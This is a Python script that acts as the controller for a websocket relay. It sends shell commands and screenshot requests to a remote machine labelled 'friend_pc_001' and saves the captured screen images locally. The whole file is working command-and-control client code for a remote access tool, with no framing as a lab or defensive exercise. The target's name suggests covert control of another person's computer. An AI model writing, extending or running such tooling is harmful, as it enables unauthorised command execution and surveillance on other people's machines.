import asyncio
import websockets
import json
import base64
from datetime import datetime

import sys
RELAY_URL = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:8765"
CLIENT_ID = "controller_001"
TARGET_ID = "friend_pc_001"

async def send_command(ws, cmd):
    cmd["from"] = CLIENT_ID
    cmd["to"] = TARGET_ID
    cmd["ts"] = str(datetime.now())
    await ws.send(json.dumps(cmd))
    print(f"[*] Sent: {cmd['type']}")

async def receive_messages(ws):
    while True:
        try:
            msg = await ws.recv()
            data = json.loads(msg)
            if data.get("to") == CLIENT_ID:
                if data["type"] == "result":
                    print(f"\n[RESULT]:\n{data['output']}")
                elif data["type"] == "screenshot":
                    img_data = base64.b64decode(data["data"])
                    with open("remote_screen.png", "wb") as f:
                        f.write(img_data)
                    print("[*] Screenshot saved as remote_screen.png")
                elif data["type"] == "pong":
                    print(f"[*] Pong from {data.get('hostname')}")
                elif data["type"] == "error":
                    print(f"[!] Error: {data['message']}")
        except Exception as e:
            print(f"[!] Receive error: {e}")

async def main():
    print(f"[*] Connecting to relay as {CLIENT_ID}...")
    async with websockets.connect(RELAY_URL) as ws:
        await ws.send(json.dumps({"type": "register", "id": CLIENT_ID}))
        print("[*] Connected. Commands: shell <cmd>, screenshot, ping, exit")
        recv_task = asyncio.create_task(receive_messages(ws))
        while True:
            cmd = input("> ").strip()
            if cmd == "exit":
                break
            elif cmd.startswith("shell "):
                await send_command(ws, {"type": "shell", "cmd": cmd[6:]})
            elif cmd == "screenshot":
                await send_command(ws, {"type": "screenshot"})
            elif cmd == "ping":
                await send_command(ws, {"type": "ping"})
            else:
                print("Commands: shell <cmd>, screenshot, ping, exit")
        recv_task.cancel()

if __name__ == "__main__":
    asyncio.run(main())

